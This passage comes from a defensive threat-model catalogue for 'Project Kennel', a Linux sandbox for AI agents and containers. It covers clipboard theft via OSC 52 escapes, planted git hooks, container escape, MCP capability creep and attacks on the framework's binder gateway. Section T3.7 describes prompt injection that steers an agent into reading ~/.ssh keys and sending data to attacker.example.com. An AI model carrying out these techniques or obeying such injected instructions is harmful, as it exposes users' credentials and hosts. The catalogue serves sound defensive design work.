**Residuals.** A workflow that legitimately requires the workload to modify CI configuration must grant CI-config writes. The framework's response is to make these grants explicit and reviewable rather than to prevent them.

**MITRE ATT&CK.** T1562.001 (Disable or Modify Tools), T1554 (Compromise Client Software Binary).

## T2.6 — Clipboard exfiltration

**Definition.** A confined workload reads or writes the user's clipboard, leaking content the user has copied or planting attacker-controlled content for the user to paste elsewhere.

**Attack pattern.** X11: any X11 client connected to the same display can read and write the primary selection and clipboard. Wayland: per-protocol restrictions, but compositor support varies. The workload reads `xclip -o`, `wl-paste`, or equivalent; exfiltrates via T1.8; or writes a malicious payload via `xclip -i` for the user to paste somewhere sensitive. **Terminal escape channel:** even with no display server, a workload attached to a terminal can emit the **OSC 52** escape (`ESC ] 52 ; c ; <base64> BEL`) to write — and on permissive terminals read — the system clipboard directly over its stdout, plus OSC 9 / 777 to raise desktop notifications. This needs no X11/Wayland grant at all; it rides the controlling tty.

**Mitigation in Project Kennel.** X11 is not directly grantable. The X11-isolated path (Xwayland-isolated or Xephyr-isolated) places the workload in a separate X server with its own clipboard. Wayland clipboard isolation depends on compositor support; documented residual. For the **terminal escape channel**, the `kennel` CLI runs the workload's PTY output through a streaming `vte`-based filter **client-side** (the interactive PTY broker, §7.9.5a, is a raw-byte router that keeps this hostile-input parser out of the daemon TCB, §4.8) and drops OSC 52 (clipboard), OSC 9 / 777 (notifications), and the DCS/APC/PM/SOS device-control bands while passing benign sequences (title, hyperlink, palette, CSI, C0). It is on by default (`[tty].filter_terminal_escapes`) and applied on every attach and reattach. The **workload** cannot opt out — it does not choose its client, and the daemon conveys the filter decision the client enforces; a raw consumer of the attach socket is an operator footgunning their own terminal, not a workload escape. It is best-effort: the standard state machine bounds a terminal-specific desync, and it shuts the low-effort injection class, not a determined desync.

**Residuals.** On Wayland systems where the compositor allows broad clipboard access (most current compositors), a workload with Wayland access can read the host clipboard. Incomplete pending compositor-level mediation work. The terminal-escape filter is best-effort, not a proof; a workload may also reach the clipboard through a granted display server rather than the tty. Disabling the filter (`filter_terminal_escapes = false`) reopens the OSC 52 tty channel by choice.

**MITRE ATT&CK.** T1115 (Clipboard Data).

## T2.7 — Screen capture and input synthesis

**Definition.** A confined workload captures the user's screen or synthesises keyboard/mouse input that appears to come from the user.

**Attack pattern.** X11: `xwd`, `import`, XTestFakeKeyEvent, XSendEvent — all permit capture or synthesis to any X11 window. TIOCSTI ioctl on the controlling tty injects characters into the input buffer as if the user typed them. Wayland: screenshot portals (user-mediated, subject to consent fatigue); input synthesis prevented at the protocol level.

**Mitigation in Project Kennel.** X11 isolation places the workload in a separate X server. TIOCSTI is gated at the kernel sysctl (`dev.tty.legacy_tiocsti = 0`); the framework refuses to start kennels on kernels where this is enabled unless explicitly overridden. Wayland screenshot portals can be denied in `dbus.session` policy.

**Residuals.** On Wayland systems with portal-mediated screenshots granted, workloads can craft requests that look benign. On older kernels with TIOCSTI re-enabled, the seccomp fallback denies the ioctl.

**MITRE ATT&CK.** T1113 (Screen Capture), T1059 (Command and Scripting Interpreter — partial analogue for input synthesis), T1185 (Browser Session Hijacking — partial analogue).

## T2.8 — Cross-context persistence via workspace triggers

**Definition.** A confined workload writes a persistent trigger — a git hook, a build-script hook, or an IDE task definition — into its own granted writable project tree. The trigger lies dormant inside the kennel and later fires in the user's *unconfined* default shell (the next `git commit`, `make`, or editor open), executing with the user's full host privileges. This defeats the transient-execution assumption that a namespace-only sandbox contains a workload only for the duration of its run. (Numbered out of family sequence: it is a Family 2 posture-degradation threat added after T1.1–T3.7 were assigned; see the family table.)

**Attack pattern.** Workload writes an executable into `.git/hooks/` (or redirects `core.hooksPath` into the writable tree), adds a recipe to a `Makefile`, a `scripts` entry to `package.json`, or a task to `.vscode/tasks.json` / `.idea/`. The artefact sits in the normal project files the agent must be able to edit. When the user subsequently invokes the corresponding tool outside the kennel, the planted command runs in the host context.

**Distinction from neighbouring threats.** Not T1.5 (an inbound *foreign* cloned repo whose build/IDE config triggers on open) — here the confined workload writes traps into its *own* grant. Not T2.5 (suppressing CI *checks* by editing `.github/`/`.gitlab-ci`) — here a trigger is *installed*, not a check removed. Sharper than T2.2 (security-degrading produced artefacts) and T1.10 (long-lived capability creep) in one specific way: a confined-tree write produces deferred detonation in the unconfined host context.

**Mitigation in Project Kennel.** A masked, pinned **workspace trust manifest** (`.trust-manifest.json`, §7.4 / `[trust].manifest`, default on) with three reinforcing limbs — pin, live tripwire, restore:

- **Pin + mask.** The CLI maintains a manifest at each writable root pinning each execution trigger by SHA-256, with a content-addressed blob store beside it (`.trust-manifest.d/`, the pinned bytes). The trigger set is a **catalogue** — `Makefile`/`package.json`/`.vscode` tasks/`.git/hooks` and escaping symlinks by default, composed additively up the config cascade (vendor → `/etc/kennel` → `~/.config`), so it is operator-tunable and visible, not hidden in the binary. The kennel **masks** both the manifest and its blob store — the spawn view over-mounts an empty read-only file/dir at their paths inside every writable bind — so the confined workload can rewrite a `Makefile` but provably cannot read or forge the pins. The operator re-pins after legitimate edits with `kennel review` (the human sign-off the masked agent cannot perform); pins are **explicit** (compile/review), never trust-on-first-use.
- **Live tripwire (`[trust].on_change`).** While the kennel runs, `kenneld` watches the pinned triggers and trigger directories on the host via an unprivileged `inotify` (operator context, notify-only) and acts on a mutation through the cgroup it already owns: `warn` (audit `fs.mutation`), `freeze` (suspend the workload for the operator), or `kill`. This is a **live kernel-mechanism reaction on the workload**, not merely host-tooling cooperation — a planted trigger is caught and the workload halted *as it happens*. Best-effort (inotify can miss a race); the teardown review is the authoritative backstop.
- **Restore (`kennel review --revert`).** Because the pinned bytes are stored, the teardown review does not just *detect* a tampered/planted trigger — it can **restore** it (rewrite from the blob, mode preserved) or remove a planted one, scoped to the trigger paths.
- **Sever the channel (`[fs.write].exclusive`, opt-in).** For a writable bind marked exclusive, the factory over-mounts an opaque sentinel on the *host* path while the kennel runs, so the operator and the workload cannot use it concurrently. This severs the **live confused-deputy channel** the enumerated manifest cannot cover (un-catalogued "run this script" content, or a file the operator has open being tampered mid-edit) — the operator only ever sees the post-teardown, post-review state. The over-mount is privilege-gated to paths the operator **owns** (a blind-mount over a non-owned path would be overreach, refused at compile and again in the privhelper).

Composes with the older partial `fs.deny` on `.git/hooks/**` etc., which a template may still apply where a hard write-exclusion is acceptable.

**Residuals.** Honest scope: (1) the manifest defends only **catalogued** triggers — a trigger of a kind not in the (operator-tunable) catalogue is unpinned until `kennel review` surfaces it as `new, unpinned`; the catalogue is best-effort in *which* triggers it covers, never *whether* it covers them (the masking and the pin are structural and complete). (2) The **post-teardown detonation** still relies on host tooling / the operator not running a tampered trigger by hand once the kennel is gone — the live tripwire halts the *workload* during the run and `--revert` can restore at teardown, but a planted trigger that survives review is the operator's to run; `[fs.write].exclusive` closes this confused-deputy channel for the run's duration where enabled. (3) `core.hooksPath` redirection still relocates hooks, though the relocated files are themselves catalogue triggers a future generation enumerates. `[trust].manifest = false` opts a workload out entirely.

**MITRE ATT&CK.** T1546 (Event Triggered Execution), T1059 (Command and Scripting Interpreter — the planted hook executes a shell command).

---

# Family 3 — Workload-class-specific threats (T3.1–T3.8)

Threats whose realisation is distinctive to a specific workload class. Most threats in families 1 and 2 apply across workload types with minor variation; the threats in this family are sharper for one class than others and warrant separate documentation.

## T3.1 — Setuid privilege escalation

**Definition.** A confined workload executes a setuid binary to gain capabilities outside its policy.

**Workload class.** Universal; appears across all workload classes but rarely realises in modern environments. Listed here because the mitigation is the same shape as other workload-class-specific threats.

**Attack pattern.** The workload invokes `sudo`, `pkexec`, `su`, or any setuid-bit binary. If the binary succeeds, the process gains its setuid uid and can perform operations outside the policy.

**Mitigation in Project Kennel.** `exec.deny_setuid = true` refuses to execute any binary with the setuid bit. `PR_SET_NO_NEW_PRIVS` is set unconditionally as a framework invariant, neutralising the setuid behaviour even if a setuid binary were to be executed. Both are framework invariants; no policy can disable them.

**Residuals.** None significant. Well-mitigated by `no_new_privs`.

**MITRE ATT&CK.** T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid).

## T3.2 — Container escape

**Definition.** A container running on the user's workstation is exploited and the attacker escapes to the host with the container daemon's privileges.

**Workload class.** Container-specific.

**Observed instances.** Container escape CVEs are recurrent. Recent examples include `runc` CVE-2024-21626 ("Leaky Vessels") and various Kubernetes runtime CVEs.

**Attack pattern.** Malicious container image, or malicious code running in a legitimate container, exploits a kernel or runtime vulnerability to gain host access. The Docker daemon socket (`/var/run/docker.sock`) is a particularly potent escalation path: access to the daemon is root-equivalent on the host.

**Mitigation in Project Kennel.** Templates default to denying `unix.connect` on `/var/run/docker.sock` and `/run/containerd/containerd.sock`. Granting access is a documented capability expansion. The framework cannot prevent in-container exploitation; it prevents a confined kennel from using the container daemon as an escalation path.

**Residuals.** A user who explicitly grants `docker.sock` access to a kennel has accepted root-on-host risk for that kennel. Documented in template threat tags.

**MITRE ATT&CK.** T1611 (Escape to Host), T1610 (Deploy Container).

## T3.3 — Container port exposure to LAN

**Definition.** A developer runs a container with `-p HOST:CONTAINER` that defaults to binding `0.0.0.0:HOST`, exposing the service to anyone on the LAN.

**Workload class.** Container-specific.

**Observed instances.** Common configuration error documented across the security literature. Almost always unintended: developers writing `-p 5432:5432` for "Postgres on the host" do not generally intend to expose Postgres to their entire local network.

**Attack pattern.** The developer (or an AI agent on the developer's behalf) issues `docker run -p 5432:5432 postgres`. Docker binds the host port on `0.0.0.0:5432` and installs a DNAT rule directing traffic to the container's veth address. The container's Postgres is reachable from anywhere on the LAN — coffee shop networks, conference WiFi, untrusted home networks.

**Mitigation in Project Kennel.** The per-kennel loopback subnet provides the address space for safe binding: the recommended form is `docker run -p 127.<tag>.<ctx>.1:5432:5432`, which binds the host port on the kennel's private loopback address. The user's default context can reach the address (host loopback is locally routed); sibling kennels cannot; the LAN cannot. Container templates document this pattern and ship shell aliases that apply it by default.

For stricter enforcement, the framework's setup step can install nftables rules that drop inbound traffic to ports bound on `0.0.0.0` by processes in confined kennels' cgroups. Requires `CAP_NET_ADMIN` at install time; opt-in.

**Residuals.** The mitigation is convention-plus-optional-enforcement. A developer who explicitly writes `-p 0.0.0.0:5432:5432`, or omits the address and relies on Docker's default, exposes the port unless the optional netfilter enforcement is installed. The audit log records the published port, so the user can see what happened.

**MITRE ATT&CK.** T1571 (Non-Standard Port), T1133 (External Remote Services).

## T3.4 — Container volume over-mounting

**Definition.** A developer mounts host directories into a container more broadly than necessary, giving the container access to credentials, configuration, or sensitive data unrelated to its function.

**Workload class.** Container-specific.

**Observed instances.** `-v $HOME:/home`, `-v /:/host`, `-v $HOME/.aws:/root/.aws` patterns appear regularly in development workflows. The Nx supply-chain attack harvested credentials from inside containers in many documented compromises — the containers had been granted broad volume mounts that included credential locations.

**Attack pattern.** The developer mounts host directories into a container to make "everything available" because narrower mounts hit functionality issues. Container compromise then has full filesystem read/write on those mounts. The container's apparent isolation does nothing because the credentials are inside the container alongside it.

**Mitigation in Project Kennel.** The `fs.read`/`fs.write` policy applies to the workload's view of the host filesystem. The workload cannot pass paths it cannot see as volume mounts. The framework's Docker socket mediation can refuse mount requests that include paths outside the kennel's fs policy (template invariant). Container templates ship with documented conventions for narrow volume mounting.

**Residuals.** Conventional Docker installations without the framework's Docker socket mediation can still pass arbitrary `-v` arguments. The mitigation is most effective when the developer is inside a confined kennel running their container management commands.

**MITRE ATT&CK.** T1083 (File and Directory Discovery), T1005 (Data from Local System).

## T3.5 — Container running as root with host UID mapping

**Definition.** A container runs as root (UID 0) inside the container; without user-namespace remapping, that's UID 0 on the host, with all root-equivalent permissions on volume mounts.

**Workload class.** Container-specific.

**Observed instances.** Default behaviour for most container images and most Docker installations. Podman in rootless mode addresses this; rootful Docker without `userns-remap` configuration does not.

**Attack pattern.** Container runs as root in-container. Docker daemon (in default mode) maps container-UID-0 to host-UID-0. Any volume mounts are accessible to the in-container root with root permissions. If the container is compromised or contains malicious code, it can modify volume-mounted files with effective root, regardless of what host UID the developer who ran the container has.

**Mitigation in Project Kennel.** Templates can refuse to grant Docker socket access if the daemon is not configured with `userns-remap` enabled. The framework's Docker socket mediation can require container specs to declare a non-root `--user` argument, or to disable root inside the container via `--security-opt no-new-privileges`. Podman in rootless mode is preferred; the framework's container templates document this preference.

**Residuals.** The framework cannot retroactively fix a Docker daemon configured without userns-remap; the mitigation depends on the workstation's Docker configuration. Documented requirement: container-using kennels assume `userns-remap` is enabled or that Podman rootless is used.

**MITRE ATT&CK.** T1611 (Escape to Host), T1068 (Exploitation for Privilege Escalation).

## T3.6 — MCP server capability creep

**Definition.** An MCP server invoked by an AI agent has its own filesystem access, network access, and credential reach, independent of the agent's policy. The MCP server's effective capabilities may exceed the user's intended grant to the agent.

**Workload class.** MCP-specific.

**Observed instances.** Architectural concern documented in the MCP literature. The pattern: an AI agent in a confined kennel invokes an MCP server (via `npx`, `uvx`, or a long-running daemon) to access a resource the agent itself cannot directly reach. The MCP server runs with its own uid-level capabilities and may legitimately need broader access than the agent. The MCP server is a capability proxy whose grants are not necessarily aligned with the agent's policy.

**Attack pattern.** Developer runs AI agent in kennel A with restricted filesystem and network. AI agent invokes MCP server X to access some resource. MCP server X runs as the user's uid, outside kennel A, with full uid-level capabilities. AI agent prompt-injects MCP server X via the protocol channel, or MCP server X is itself compromised (T1.3) and exfiltrates data using its own capabilities.

**Mitigation in Project Kennel.** MCP servers invoked from within a kennel inherit that kennel's policy by default — the MCP server runs as a child process within the same kennel and is subject to the same constraints. For MCP servers that legitimately need capabilities the kennel does not grant (e.g., an MCP server that needs access to a database the kennel cannot reach), the framework supports per-MCP-server sub-kennels with their own policy, communicating with the parent kennel via brokered AF_UNIX sockets. Each MCP server's capabilities are then explicit and reviewable.

**Residuals.** MCP servers run outside any kennel — the typical case for installed MCP servers as of this catalogue (v0.3) — operate with full uid capabilities. Project Kennel's mitigation requires the user to opt in to running MCP servers inside kennels; the default MCP server installation pattern does not.

**MITRE ATT&CK.** T1199 (Trusted Relationship), T1071 (Application Layer Protocol).

## T3.7 — AI agent prompt injection from project content

**Definition.** An AI agent reads attacker-controlled content from the project tree (a docstring, a README, a configuration file) that contains instructions designed to redirect the agent's behaviour.

**Workload class.** AI-agent-specific.

**Observed instances.** The Mindgard Cline research (October 2025) demonstrated this directly: prompt-injected Python docstrings caused Cline to read environment variables and exfiltrate them via DNS queries. The Clinejection chain (February 2026) exploited prompt injection in GitHub issue titles to compromise a release pipeline. The pattern generalises: any project content the agent will read can contain injection payloads.

**Attack pattern.** Attacker places instructions in content the agent will read — a comment in source code, a docstring in a Python module, a heading in a Markdown file, a value in a configuration file. The agent reads the content as part of its task. The agent's prompt-handling treats the content as instructions and executes them. The instructions may direct the agent to read sensitive files, make network connections, modify other files, or invoke other tools.

**Mitigation in Project Kennel.** The framework constrains what the agent can do regardless of how it was prompted. The constructed-view filesystem means injected instructions to "read `~/.ssh/id_ed25519`" fail because the file is not in the view. The network allowlist means injected instructions to "send data to attacker.example.com" fail at the proxy. The framework does not prevent prompt injection; it constrains the blast radius of injected instructions to what the kennel's policy permits.

**Residuals.** Injected instructions that direct the agent to actions within its policy succeed. An agent with network access to `api.openai.com` can be prompt-injected to send exfiltrated content to that endpoint as part of an apparently-legitimate API call. Same in-band exfiltration problem as T1.8. Pattern-based detection of injection attempts in agent inputs is the complementary control (out of scope for this framework).

**MITRE ATT&CK.** T1199 (Trusted Relationship), T1556 (Modify Authentication Process — partial analogue applied to instruction-handling).

## T3.8 — Substrate trust: the image-supplied runtime closure is unvetted

**Definition.** A `[rootfs]` grant boots an operator-declared OCI image as the kennel's root filesystem (design §7.11). Kennel applies its full confinement contract to the image, but does *not* vet the image's contents: the entrypoint's dynamic closure (`ld.so`, libc, the NSS modules, every shared object loaded after `execve`) and the image's runtime config (`Env`, `Entrypoint`, `User`) are operator-declared substrate, not Kennel-pinned. The integrity assertion the standard run model makes over a host-trusted read-only `/usr` narrows to *provenance*: the substrate provably came from `image@sha256:…`, but its bytes are not vouched for.

**Workload class.** Container / image-substrate-specific.

**Observed instances.** This is the deliberate trade of running vendor OCI images — the same trust posture Docker and Podman take, where the image's userspace is trusted by the operator who chose to run it. It is distinct from T3.2 (escape) and T3.5 (root with host-UID mapping): here there is no escape and no host-uid mapping, and the workload acquires no capability, no `mount`, no `unshare`. The residual is narrower and is the whole point of the grant — the *confined* substrate is unvetted.

**Attack pattern.** A malicious or compromised image ships a trojaned libc / `ld.so` / NSS module, or an entrypoint whose dynamic closure pulls attacker code; or sets a loader-control `Env` (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `NODE_OPTIONS`); or bakes a non-root uid and `chown`s its writable dirs to it. The code runs *confined* — no host capability, no mount, no egress beyond `[net]` policy, no read outside the constructed view — but executes attacker logic inside the granted confinement, against the granted filesystem and network. The image's content integrity is the operator's waiver, not Kennel's guarantee.

**Mitigation in Project Kennel.** The build/run split keeps every parser — registry protocol, manifest, tar extraction, and the image's own runtime config — out of the daemon: each runs inside a confined kennel at workload authority, so a parser bug is contained like any workload and the TCB does not grow (design §7.11.1, §7.11.4). The image is digest-pinned at fetch (the provenance floor), and the runner refuses unless the signed `[rootfs].image` equals the store entry's recorded `digest`. The launcher strips the `AT_SECURE`-equivalent env-injection set (design §7.11.6) before applying the image's `Env`, so the image cannot acquire loader/runtime/shell injection for free. Every confinement property holds over the image root, none of it depending on the substrate's provenance: the per-kennel network namespace and its egress boundary, the SOCKS proxy and `[net]` policy, the masked identity and the targeted `/etc` overlay (`resolv.conf`/`nsswitch`/`hostname`/`passwd`), the constructed `/dev` allowlist, seccomp, Landlock, the absence of a daemon socket, the absence of a nested user namespace. The grant is **loud**: `[rootfs]` requires a `reason`, and the substrate-trust exposure is *derived* from the grant and surfaced by `kennel policy risks` with the grant as carrier — the mechanism by which `mode = host` derives T1.6. Opt-in hardening up the integrity ladder closes the at-rest gap: a content-addressed store entry (verified before pivot) and per-file fs-verity give tamper-evidence over the operator-owned tree and the config the launcher parses.

**Residuals.** Confinement is the claim; content integrity is not. The entrypoint is provenance-pinned (the image digest), not per-binary hashed: there is no per-binary pin in the OCI model — `[rootfs]` and `[workload]` are mutually exclusive, so "this exact entrypoint binary" narrows to "this exact image, by digest," and the dynamic closure stays unpinned. Image `Env` enters the workload (sanitised of injection vectors, policy `[env]` overriding); image `User` is not honored (no subuid range — a uid-baked image fails on `EACCES`, not identity); `fs.execute` is coarse over a declared substrate. A `persistence = "persist"` rootfs adds a distinct residual: its Kennel-managed overlay upper accumulates divergence *outside* the integrity ladder (which covers the image lower, not lower+upper), so `kennel policy risks` derives a second exposure from `persistence = "persist"` against the `[rootfs]` `reason`; `discard` (ephemeral upper) and `readonly` (no upper) do not carry it. Content integrity over the image tree past the fetch digest is the operator's to raise via the integrity ladder. These residuals are derived from the `[rootfs]` grant, not stored on a `threats.reinstated` field; the shape of the grant is the tag (design §7.11.9).

**MITRE ATT&CK.** T1610 (Deploy Container), T1525 (Implant Internal Image), T1195.002 (Compromise Software Supply Chain).

---

# Family 5 — Framework attack surface (T5.1–T5.4)

Families 1–3 catalogue what a confined workload does to the host. This family catalogues threats against the framework's *own* boundary-crossing mechanism. The mechanism is load-bearing by construction: every kennel runs a per-instance binderfs bus with `kenneld` as its context manager (node 0), and that bus is the kennel's single kernel-mediated gateway — the one place anything crosses the kennel boundary, carrying the construction/lifecycle control plane (`kennel-bin-init` ⇄ `kenneld`), the protocol facades that replace raw socket grants (`org.projectkennel.IAfUnix/default`, future `IDBus`), the service registry and inter-kennel calls, and the network crossing (`org.projectkennel.INet/default`). Because every crossing funnels through `kenneld`, `kenneld` is the workload's primary reachable attack surface and the framework's trust anchor; this family documents the threats that follow from that centrality. (Design §7.1 develops the gateway; §7.5 the network crossing; §7.2 the construction model.)

## T5.1 — Binder gateway transaction surface

**Definition.** A confined workload sends crafted binder transactions to `kenneld` (node 0) — malformed command streams, oversized or pointer-bearing payloads, forged service names, transactions targeting reserved or lifecycle verbs — to crash, confuse, or escape via the framework's gateway.

**Attack pattern.** The workload links a libbinder-shaped client (it cannot avoid the bus — the bus is its only path off-namespace) and drives the `BC_*`/`BR_*` command stream directly: it issues `addService`/`getService` for reserved `org.projectkennel.*` names it does not own; it addresses the lifecycle verbs on node 0 (the high `0x100+` range carrying `GET_SANDBOX_PLAN`/`NOTIFY_*`); it submits `binder_transaction_data` with malformed offsets, attempting to smuggle `BINDER_TYPE_PTR`/raw pointers or unexpected fd arrays into `kenneld`'s decoder. The goal is a decoder bug in `kenneld`/`kennel-lib-binder`, or a logic gap that grants a service the policy never declared.

**Mitigation in Project Kennel.** The gateway is policy-mediated per call, not per connection: `kenneld` is the decision point for every `addService`/`getService`/facade transaction and resolves only services the signed policy declares (the `isDeclared` / VINTF-declared analogue). Reserved `org.projectkennel.*` names are kenneld-owned — only kenneld may register them, so a workload cannot squat a facade name. Caller identity is **kernel-stamped and unforgeable**: the binder driver injects `sender_pid`/`sender_euid`; lifecycle/config verbs are gated to `sender_pid == init_host_pid && sender_euid == 0` (the workload runs as the operator's non-zero uid and has the wrong pid), so the lifecycle range is inert for the workload even though it can address node 0. The `BC_*`/`BR_*` decoder is the framework's principal untrusted-input parser and carries a mandatory fuzz target (design §10.6); cross-instance transactions reject `BINDER_TYPE_PTR`/raw pointers so payloads are forced into bounded, copied flat buffers with no shared-memory hazard. `kenneld`'s policy core is `#![forbid(unsafe_code)]`; all `unsafe` is confined to the `kennel-lib-binder` ABI crate.

**Residuals.** The decoder is hardened by fuzzing, not proven; a novel parser bug in `kennel-lib-binder` or a policy-evaluation gap in `kenneld` would be reachable from inside every kennel, since the bus is unavoidable. The blast radius of such a bug is `kenneld`'s privilege (T5.3). Compromise of the kernel binder driver itself is out of scope (X7).

**MITRE ATT&CK.** T1190 (Exploit Public-Facing Application — analogue: the in-kennel gateway endpoint), T1068 (Exploitation for Privilege Escalation).

## T5.2 — Cross-kennel binder relay abuse

**Definition.** A confined workload abuses the inter-kennel binder relay — `kenneld`'s bilateral `provide`/`consume` mechanism that lets one kennel reach a service in another — to reach a kennel it was not granted, or to use a granted edge as an exfiltration or lateral-movement channel between otherwise-isolated kennels.

**Attack pattern.** Inter-kennel isolation is otherwise an invariant with no designed escape; the MCP topology (an agent kennel calling tool-server kennels, tool servers spawning per-invocation kennels) deliberately punches a controlled hole in it. A hostile workload tries to widen that hole: enumerate or `getService` cross-instance names it was not granted; ride a legitimately-granted `consume` edge to move data into a sibling kennel that has different (broader) network or filesystem grants, using the relay as a confused deputy; or have a compromised *provider* kennel attack its consumers through the service interface.

**Mitigation in Project Kennel.** Cross-instance reach exists only where the signed policy of *both* kennels declares it — the relay requires a matching `provide` on one side and `consume` on the other (a bilateral, policy-declared edge); there is no ambient cross-kennel visibility and no default-reachable sibling. `kenneld` owns every reserved node and is the sole relay: a transaction never crosses instances except through `kenneld`, which re-checks both policies per call and audits the crossing (`binder.cross`, distinct from same-kennel lifecycle events). Each kennel's binderfs is a separate `FS_USERNS_MOUNT` instance in its own user namespace; a workload cannot open a sibling's bus directly. Copy-isolation on cross-instance transactions (no shared pointers) prevents a provider and consumer sharing memory.

**Residuals.** A legitimately-granted cross-kennel edge is, by design, a channel: data the policy permits to flow between two kennels can carry exfiltrated content within that grant (the same in-band-exfiltration shape as T1.8, now between kennels rather than to an external API). The framework constrains *which* kennels may speak, not *what* they say across a permitted edge. A compromised provider kennel can return hostile responses to its consumers; the consumer's own confinement bounds the damage, but the interface trust is real and is the price of the MCP topology.

**MITRE ATT&CK.** T1199 (Trusted Relationship), T1570 (Lateral Tool Transfer), T1041 (Exfiltration Over C2 Channel — analogue across a permitted relay edge).

## T5.3 — `kenneld`-as-relay trusted-computing-base growth

**Definition.** Routing every boundary crossing through `kenneld` concentrates trust: `kenneld` is the context manager (node 0) for every kennel, the relay for every cross-instance call, the holder of the full `Plan`, and the policy decision point for every facade and network transaction. A compromise of `kenneld` is a compromise of every kennel on the host simultaneously.

**Attack pattern.** This is a structural threat, not a single exploit: the gateway design makes `kenneld` reachable from inside every kennel (T5.1) and load-bearing for inter-kennel isolation (T5.2), so it is both the most-attacked and the most-trusted userspace component. Any code path where `kenneld` parses workload-influenced bytes (the binder command stream, service-name strings, transaction payloads, the SOCKS5-derived `INet` requests relayed from the shim) is a path where a single bug escalates to host-wide kennel compromise. The relay role grows the TCB precisely because it centralises what was previously per-kennel.

**Mitigation in Project Kennel.** The design bounds `kenneld`'s exposure rather than eliminating its centrality (which is the point of having one auditable chokepoint). `kenneld` is `#![forbid(unsafe_code)]`; the only `unsafe` in the binder path is the small, separately-reviewed, fuzzed `kennel-lib-binder` ABI crate. `kenneld` is never in any data path — it relays transactions and passes fds (`BINDER_TYPE_FD`), then steps aside; bulk bytes flow directly between the workload (or shim) and the far fd, so `kenneld` parses only control-plane structures, not payload streams. Blocking I/O lives in delegates (`host-netproxy`, the host-side BIND leg) over per-kennel socketpairs, not in `kenneld`'s looper, so a slow or hostile delegate degrades to a refusal on one instance and never stalls the shared looper. Privilege is minimised: `kenneld` runs as the operator, holds no host capabilities, and is *not* the constructor — the privhelper, not `kenneld`, holds `CAP_SETUID`/`CAP_NET_ADMIN` and builds the kennel (T5.4), so a `kenneld` compromise does not directly confer construction-time privilege.

**Residuals.** Centralisation is intrinsic to the single-chokepoint design and is not eliminated: `kenneld` remains a host-wide trust anchor, and a `kenneld` compromise is a multi-kennel compromise. The mitigation is to keep `kenneld`'s parsing surface small, memory-safe, and fuzzed, and to keep privilege out of it — not to remove the concentration. The kernel binder driver, on which the whole gateway rests, is out of scope (X7).

**MITRE ATT&CK.** T1068 (Exploitation for Privilege Escalation), T1554 (Compromise Client Software Binary — analogue: the shared trust anchor).

## T5.4 — Host uid 0 mapped into the kennel user namespace

**Definition.** Constructing the kennel maps host root (`0 0 1`) into the kennel's user namespace so that binderfs, the view root, `/dev`, and the library binds are owned by a real uid 0 rather than landing on the overflow `nobody`. Mapping host uid 0 into a namespace a workload runs in is, in the general case, a privilege-escalation hazard: a process that reaches userns-0 while host-owned resources are reachable could exercise host DAC as root.

**Attack pattern.** The danger is a uid-0-mapped actor running *while the host filesystem is still visible* in its mount namespace — that actor holds host kuid 0 over host-root-owned files and could read or modify them. The threat is therefore any path by which operator-controlled or workload code executes as userns-0 before the host root has been severed, or regains uid 0 after the drop.

**Mitigation in Project Kennel.** The escalation window is closed by construction, and the **invariant is that no operator-controlled code ever runs as userns-0**:

- The kennel's identity map is the precise two lines `0 0 1` (host root) plus `<operator> <operator> 1` (and one line per granted gid), written by the privhelper in a **single `write(2)`** with `CAP_SETFCAP`. There is no subuid/subgid range and no `0 0 N` extent — only host root itself is mapped, deliberately ("there be dragons" for sub-id ranges).
- The **privhelper is the factory**: in its own post-`clone` child it writes the maps, builds the root-owned surfaces (view, `/dev`, library binds, binderfs), chowns the binder device to the operator, and **`pivot_root`s away the host root — all before any other code runs**. It then `fexecve`s the trusted, root-owned `kennel-bin-init` as PID 1. The init binary is opened on the host *before* the clone and execed by descriptor, so it never appears in the view and the host path is gone by the time it runs.
- `kennel-bin-init` is therefore the **only userns-0 process, and it is trapped inside the pivoted view from its first instruction** — the host filesystem is *physically absent* from its mount namespace, so host DAC on host-root-owned files is impossible despite kuid 0. It holds no ambient host capabilities (only userns-scoped `CAP_SETUID`/`CAP_SETGID`, enough to drop the workload), and is trusted by provenance: its path comes from the root-owned deployment config, the privhelper verifies root-ownership and non-writability before `fexecve`.
- **The workload is never uid 0.** `kennel-bin-init` forks the facades and the workload and drops each to the operator (`set_gid` → groups → `set_uid`) before `no_new_privs` + seccomp + Landlock make the drop irreversible. Nothing regains uid 0 after the drop.

The escalation-window analysis is therefore: the single transient userns-0 actor (the factory child, then `kennel-bin-init`) is the privhelper's own trusted code, and from the moment uid 0 could touch anything, the host root is already detached. The one window where "a uid-0-mapped binary runs while the host fs is still visible" would exist is eliminated by doing all privileged construction (including `pivot_root`) inside the privhelper before the hand-off, and by zero-arg `fexecve` so nothing operator-supplied reaches userns-0.

**Residuals.** Construction shifts the framework's largest *root-parses-operator-input* surface into the privhelper: it parses the construction half of the `Plan` host-side (before any namespace exists, so there is no sandbox to manipulate it) and holds `CAP_SETUID`/`CAP_NET_ADMIN`/`CAP_SETFCAP`. A bug in the construction-half decoder is a host-root bug; it is mitigated by parsing host-side, by the bounded/fuzzed construction-half codec (design §10.6), and by splitting the `Plan` so the privhelper sees only the construction half. The supervision half is parsed post-pivot by `kennel-bin-init` (contained). Compromise of the kernel's user-namespace or binderfs implementation is out of scope (X7).

**MITRE ATT&CK.** T1068 (Exploitation for Privilege Escalation), T1548 (Abuse Elevation Control Mechanism).

---

# Family 4 — Out of scope (X1–X11)

Threats Project Kennel deliberately does not address.

| ID | Threat | Why out of scope |
|---|---|---|
| X1 | Process running as a different real uid | Handled by existing Unix permissions |
| X2 | Process running as root | Handled by root permissions and root-targeted MAC |
| X3 | Hardware-level attacks (cold boot, DMA, side channels, Spectre-class) | Out of any user-space framework's reach |
| X4 | Physical access | Out of any user-space framework's reach |
| X5 | The user actively cooperating with the workload | The user can grant any capability; the framework cannot override informed consent |
| X6 | Network-level attacks against the host's exposed services | A different threat model; the framework defends outbound, not inbound |
| X7 | Compromise of the framework's own kernel dependencies (Landlock, BPF, etc.) | Beyond the framework's boundary |
| X8 | Compromise of vetted system tools the framework depends on (xdg-dbus-proxy, Xephyr, etc.) | Beyond the framework's boundary |
| X9 | A confined kennel using its legitimate API access to exfiltrate data | Within-channel exfiltration via authorised destinations; documented as T1.8 residual |
| X11 | Semantic security regressions in workload-produced code that cannot be detected by pattern matching | Requires human review; framework can flag known anti-patterns but cannot evaluate code for novel security flaws |

---

# Incident appendix

Grounded incidents that motivated specific T-entries.

## Ona Veto research (March 2026)

